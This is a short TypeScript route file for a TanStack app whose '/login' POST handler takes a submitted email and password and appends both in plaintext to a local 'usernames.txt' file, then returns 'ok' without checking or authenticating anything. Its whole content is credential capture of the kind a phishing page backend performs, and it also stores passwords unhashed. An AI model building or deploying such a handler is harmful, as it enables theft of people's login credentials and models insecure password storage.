import { createFileRoute } from "@tanstack/react-router";
import { appendFile } from "node:fs/promises";
import { join } from "node:path";

async function POST({ request }: { request: Request }) {
  const data = await request.json() as { email: string; password: string };

  const file = join(process.cwd(), "usernames.txt");
  await appendFile(file, `Account: ${data.email}\nPass: ${data.password}\n`);

  return Response.json({ status: "ok" });
}

export const Route = createFileRoute("/login")({
  server: { handlers: { POST } },
});   
